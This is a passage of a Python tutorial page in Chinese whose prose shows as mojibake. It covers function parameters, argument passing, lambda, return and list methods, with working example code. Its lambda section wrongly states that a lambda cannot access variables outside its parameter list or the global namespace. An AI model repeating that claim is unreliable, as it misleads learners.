<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> print_welcome<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span>w <span class="token operator">=</span> <span class="token number">4</span>h <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"width ="</span><span class="token punctuation">,</span> w<span class="token punctuation">,</span> <span class="token string">" height ="</span><span class="token punctuation">,</span> h<span class="token punctuation">,</span> <span class="token string">" area ="</span><span class="token punctuation">,</span> area<span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">print_welcome<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span>area<span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å‚æ•°ä¼ é€’"><a href="#å‚æ•°ä¼ é€’" class="headerlink" title="å‚æ•°ä¼ é€’"></a>å‚æ•°ä¼ é€’</h3><h4 id="ä¸å¯å˜ç±»å‹"><a href="#ä¸å¯å˜ç±»å‹" class="headerlink" title="ä¸å¯å˜ç±»å‹"></a>ä¸å¯å˜ç±»å‹</h4><p>numberï¼Œstringï¼Œtuples</p><ol><li>å…ˆèµ‹å€¼<code>a = 2</code>ï¼Œå†èµ‹å€¼<code>a = 5</code>ï¼Œåè€…è¦†ç›–å‰è€…ï¼Œç›¸å½“äºæ–°ç”Ÿæˆä¸€ä¸ªå€¼ï¼Œåœ°å€å˜äº†</li><li>ä¼ é€’çš„å‚æ•°å€¼ä¸ä¼šå½±å“åŸå€¼ï¼Œå‡½æ•°å†…éƒ¨é‡æ–°èµ‹å€¼ä¼šç”Ÿæˆä¸€ä¸ªçš„å¯¹è±¡ï¼Œä¸ä¼šå½±å“å‡½æ•°å¤–çš„å€¼</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡</span>    a<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># ä¸€ä¸ªæ–°å¯¹è±¡</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''140721657271968-140721657271968140721657272256'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å¯å˜ç±»å‹"><a href="#å¯å˜ç±»å‹" class="headerlink" title="å¯å˜ç±»å‹"></a>å¯å˜ç±»å‹</h4><p>listï¼Œdictionaryï¼Œset</p><ol><li>åˆ—è¡¨èµ‹å€¼ï¼Œç„¶åå†ä¿®æ”¹å…ƒç´ ï¼Œåˆ—è¡¨åœ°å€ä¸ä¼šæ”¹å˜ï¼Œè¿˜æ˜¯åŸæ¥é‚£ä¸ªåˆ—è¡¨</li><li>ä¼ å…¥å‡½æ•°çš„è¿™ç±»å‚æ•°ï¼Œåœ¨å‡½æ•°å†…ä¿®æ”¹ä¼šå½±å“åˆ°å‡½æ•°å¤–çš„å€¼</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">changeme</span><span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""ä¿®æ”¹ä¼ å…¥çš„åˆ—è¡¨"""</span>    mylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å‡½æ•°å†…å–å€¼: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token comment"># è°ƒç”¨changemeå‡½æ•°</span>mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>changeme<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å‡½æ•°å¤–å–å€¼: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''å‡½æ•°å†…å–å€¼:  [10, 20, 30, [1, 2, 3, 4]]å‡½æ•°å¤–å–å€¼:  [10, 20, 30, [1, 2, 3, 4]]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><h4 id="å¿…éœ€å‚æ•°"><a href="#å¿…éœ€å‚æ•°" class="headerlink" title="å¿…éœ€å‚æ•°"></a>å¿…éœ€å‚æ•°</h4><p>å¿…éœ€å‚æ•°é¡»ä»¥æ­£ç¡®çš„é¡ºåºä¼ å…¥å‡½æ•°ã€‚è°ƒç”¨æ—¶çš„æ•°é‡å¿…é¡»å’Œå£°æ˜æ—¶çš„ä¸€æ ·</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">printme</span><span class="token punctuation">(</span> <span class="token builtin">str</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"æ‰“å°ä»»ä½•ä¼ å…¥çš„å­—ç¬¦ä¸²"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment"># è°ƒç”¨ printme å‡½æ•°ï¼Œä¸åŠ å‚æ•°ä¼šæŠ¥é”™</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span>printme<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å…³é”®å­—å‚æ•°"><a href="#å…³é”®å­—å‚æ•°" class="headerlink" title="å…³é”®å­—å‚æ•°"></a>å…³é”®å­—å‚æ•°</h4><p>å…³é”®å­—å‚æ•°å’Œå‡½æ•°è°ƒç”¨å…³ç³»ç´§å¯†ï¼Œå‡½æ•°è°ƒç”¨ä½¿ç”¨å…³é”®å­—å‚æ•°æ¥ç¡®å®šä¼ å…¥çš„å‚æ•°å€¼ï¼Œä½¿ç”¨å…³é”®å­—å‚æ•°å…è®¸å‡½æ•°è°ƒç”¨æ—¶å‚æ•°çš„é¡ºåºä¸å£°æ˜æ—¶ä¸ä¸€è‡´ï¼Œå› ä¸º Python è§£é‡Šå™¨èƒ½å¤Ÿç”¨å‚æ•°ååŒ¹é…å‚æ•°å€¼ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"æ‰“å°ä»»ä½•ä¼ å…¥çš„å­—ç¬¦ä¸²"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"åå­—: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å¹´é¾„: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment">#è°ƒç”¨printinfoå‡½æ•°</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é»˜è®¤å‚æ•°"><a href="#é»˜è®¤å‚æ•°" class="headerlink" title="é»˜è®¤å‚æ•°"></a>é»˜è®¤å‚æ•°</h4><p>è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’å‚æ•°ï¼Œåˆ™ä¼šä½¿ç”¨é»˜è®¤å‚æ•°ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"æ‰“å°ä»»ä½•ä¼ å…¥çš„å­—ç¬¦ä¸²"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"åå­—: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å¹´é¾„: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment">#è°ƒç”¨printinfoå‡½æ•°</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"------------------------"</span><span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span class="token triple-quoted-string string">'''åå­—:  runoobå¹´é¾„:  50------------------------åå­—:  runoobå¹´é¾„:  35'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä¸å®šé•¿å‚æ•°"><a href="#ä¸å®šé•¿å‚æ•°" class="headerlink" title="ä¸å®šé•¿å‚æ•°"></a>ä¸å®šé•¿å‚æ•°</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span><span class="token punctuation">[</span>formal_args<span class="token punctuation">,</span><span class="token punctuation">]</span> <span class="token operator">*</span>var_args_tuple <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"å‡½æ•°_æ–‡æ¡£å­—ç¬¦ä¸²"</span>   function_suite   <span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span><span class="token punctuation">[</span>formal_args<span class="token punctuation">,</span><span class="token punctuation">]</span> <span class="token operator">**</span>var_args_dict <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"å‡½æ•°_æ–‡æ¡£å­—ç¬¦ä¸²"</span>   function_suite   <span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>åŠ äº†æ˜Ÿå· ***** çš„å‚æ•°ä¼šä»¥å…ƒç»„(tuple)çš„å½¢å¼å¯¼å…¥ï¼Œå­˜æ”¾æ‰€æœ‰æœªå‘½åçš„å˜é‡å‚æ•°</li><li>åœ¨å‡½æ•°è°ƒç”¨æ—¶æ²¡æœ‰æŒ‡å®šå‚æ•°ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªç©ºå…ƒç»„</li><li>åŠ äº†ä¸¤ä¸ªæ˜Ÿå· *<strong>*</strong> çš„å‚æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼å¯¼å…¥</li><li>å¦‚æœå•ç‹¬å‡ºç°æ˜Ÿå· ***** åçš„å‚æ•°å¿…é¡»ç”¨å…³é”®å­—ä¼ å…¥</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">*</span>vartuple <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•°"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"è¾“å‡º: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">for</span> var <span class="token keyword">in</span> vartuple<span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>var<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment"># è°ƒç”¨printinfo å‡½æ•°</span>printinfo<span class="token punctuation">(</span> <span class="token number">10</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¾“å‡º: 10è¾“å‡º: 706050'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">**</span>vardict <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•°"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"è¾“å‡º: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>vardict<span class="token punctuation">)</span> <span class="token comment"># è°ƒç”¨printinfo å‡½æ•°</span>printinfo<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¾“å‡º: 1{'a': 2, 'b': 3}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h3><ol><li>ä½¿ç”¨ lambda æ¥åˆ›å»ºåŒ¿åå‡½æ•°</li><li>lambdaçš„ä¸»ä½“æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªä»£ç å—</li><li>lambda å‡½æ•°æ‹¥æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼Œä¸”ä¸èƒ½è®¿é—®è‡ªå·±å‚æ•°åˆ—è¡¨ä¹‹å¤–æˆ–å…¨å±€å‘½åç©ºé—´é‡Œçš„å‚æ•°</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">[</span>arg1 <span class="token punctuation">[</span><span class="token punctuation">,</span>arg2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>argn<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">:</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment"># è°ƒç”¨sumå‡½æ•°</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"ç›¸åŠ åçš„å€¼ä¸º : "</span><span class="token punctuation">,</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"ç›¸åŠ åçš„å€¼ä¸º : "</span><span class="token punctuation">,</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''ç›¸åŠ åçš„å€¼ä¸º :  30ç›¸åŠ åçš„å€¼ä¸º :  40'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="returnè¯­å¥"><a href="#returnè¯­å¥" class="headerlink" title="returnè¯­å¥"></a>returnè¯­å¥</h3><p><strong>return [è¡¨è¾¾å¼]</strong> è¯­å¥ç”¨äºé€€å‡ºå‡½æ•°ï¼Œé€‰æ‹©æ€§åœ°å‘è°ƒç”¨æ–¹è¿”å›ä¸€ä¸ªè¡¨è¾¾å¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯å†™å‡½æ•°è¯´æ˜</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># è¿”å›2ä¸ªå‚æ•°çš„å’Œ."</span>   total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å‡½æ•°å†… : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>   <span class="token keyword">return</span> total <span class="token comment"># è°ƒç”¨sumå‡½æ•°</span>total <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"å‡½æ•°å¤– : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''å‡½æ•°å†… :  30å‡½æ•°å¤– :  30'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¼ºåˆ¶ä½ç½®å‚æ•°"><a href="#å¼ºåˆ¶ä½ç½®å‚æ•°" class="headerlink" title="å¼ºåˆ¶ä½ç½®å‚æ•°"></a>å¼ºåˆ¶ä½ç½®å‚æ•°</h3><p>å‡½æ•°å½¢å‚è¯­æ³• / ç”¨æ¥æŒ‡æ˜å‡½æ•°å½¢å‚å¿…é¡»ä½¿ç”¨æŒ‡å®šä½ç½®å‚æ•°ï¼Œä¸èƒ½ä½¿ç”¨å…³é”®å­—å‚æ•°çš„å½¢å¼ã€‚</p><p>å½¢å‚ a å’Œ b å¿…é¡»ä½¿ç”¨æŒ‡å®šä½ç½®å‚æ•°ï¼Œc æˆ– d å¯ä»¥æ˜¯ä½ç½®å½¢å‚æˆ–å…³é”®å­—å½¢å‚ï¼Œè€Œ e å’Œ f è¦æ±‚ä¸ºå…³é”®å­—å½¢å‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">)</span>f<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span> e<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> f<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''10 20 30 40 50 60'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><h3 id="åˆ—è¡¨-1"><a href="#åˆ—è¡¨-1" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">list.append(x)</td><td align="left">æŠŠä¸€ä¸ªå…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨çš„ç»“å°¾ï¼Œç›¸å½“äº a[len(a):] = [x]ã€‚</td></tr><tr><td align="left">list.extend(L)</td><td align="left">é€šè¿‡æ·»åŠ æŒ‡å®šåˆ—è¡¨çš„æ‰€æœ‰å…ƒç´ æ¥æ‰©å……åˆ—è¡¨ï¼Œç›¸å½“äº a[len(a):] = Lã€‚</td></tr><tr><td align="left">list.insert(i, x)</td><td align="left">åœ¨æŒ‡å®šä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡†å¤‡æ’å…¥åˆ°å…¶å‰é¢çš„é‚£ä¸ªå…ƒç´ çš„ç´¢å¼•ï¼Œä¾‹å¦‚ a.insert(0, x) ä¼šæ’å…¥åˆ°æ•´ä¸ªåˆ—è¡¨ä¹‹å‰ï¼Œè€Œ a.insert(len(a), x) ç›¸å½“äº a.append(x) ã€‚</td></tr><tr><td align="left">list.remove(x)</td><td align="left">åˆ é™¤åˆ—è¡¨ä¸­å€¼ä¸º x çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ²¡æœ‰è¿™æ ·çš„å…ƒç´ ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚</td></tr><tr><td align="left">list.pop([i])</td><td align="left">ä»åˆ—è¡¨çš„æŒ‡å®šä½ç½®ç§»é™¤å…ƒç´ ï¼Œå¹¶å°†å…¶è¿”å›ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šç´¢å¼•ï¼Œa.pop()è¿”å›æœ€åä¸€ä¸ªå…ƒç´ ã€‚å…ƒç´ éšå³ä»åˆ—è¡¨ä¸­è¢«ç§»é™¤ã€‚ï¼ˆæ–¹æ³•ä¸­ i ä¸¤è¾¹çš„æ–¹æ‹¬å·è¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œè€Œä¸æ˜¯è¦æ±‚ä½ è¾“å…¥ä¸€å¯¹æ–¹æ‹¬å·ï¼Œä½ ä¼šç»å¸¸åœ¨ Python åº“å‚è€ƒæ‰‹å†Œä¸­é‡åˆ°è¿™æ ·çš„æ ‡è®°ã€‚ï¼‰</td></tr><tr><td align="left">list.clear()</td><td align="left">ç§»é™¤åˆ—è¡¨ä¸­çš„æ‰€æœ‰é¡¹ï¼Œç­‰äºdel a[:]ã€‚</td></tr><tr><td align="left">list.index(x)</td><td align="left">è¿”å›åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå€¼ä¸º x çš„å…ƒç´ çš„ç´¢å¼•ã€‚å¦‚æœæ²¡æœ‰åŒ¹é…çš„å…ƒç´ å°±ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚</td></tr><tr><td align="left">list.count(x)</td><td align="left">è¿”å› x åœ¨åˆ—è¡¨ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚</td></tr><tr><td align="left">list.sort()</td><td align="left">å¯¹åˆ—è¡¨ä¸­çš„å…ƒç´ è¿›è¡Œæ’åºã€‚</td></tr><tr><td align="left">list.reverse()</td><td align="left">å€’æ’åˆ—è¡¨ä¸­çš„å…ƒç´ ã€‚</td></tr><tr><td align="left">list.copy()</td><td align="left">è¿”å›åˆ—è¡¨çš„æµ…å¤åˆ¶ï¼Œç­‰äºa[:]ã€‚</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5]</span><span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">]</span><span class="token builtin">list</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999, 44, 55]</span><span class="token builtin">list</span><span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hhhh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 'hhhh', 1, 5, 999, 44, 55]</span><span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'hhhh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 2, 1, 5, 999, 44, 55]</span>var <span class="token operator">=</span> list2<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token comment"># 55</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token comment"># [44]</span>list2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token comment"># []</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token builtin">list</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [1, 1, 2, 5, 44, 55, 999]</span><span class="token builtin">list</span><span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token 